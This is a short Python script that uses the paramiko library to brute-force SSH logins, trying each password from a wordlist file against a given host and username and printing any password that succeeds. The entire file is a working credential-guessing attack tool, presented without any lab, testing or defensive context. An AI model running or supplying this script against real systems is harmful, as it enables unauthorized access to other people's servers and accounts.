import paramiko
import time

def brute_force_ssh(host, username, password_file_path):
    print(f"[~] Starting brute force on {host} with username '{username}'...")
    
    # Load password list
    try:
        with open(password_file_path, "r") as file:
            passwords = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[!] Password file not found: {password_file_path}")
        return

    # SSH setup
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in passwords:
        try:
            ssh.connect(hostname=host, username=username, password=password, timeout=3)
            print(f"[+] SUCCESS! Username: {username}, Password: {password}")
            ssh.close()
            return password  # Stop after finding the correct password
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {password}")
        except Exception as e:
            print(f"[!] Error: {e}")
        time.sleep(0.5)  # Be polite to the server

    print("[-] Brute force failed. No valid password found.")
    return None
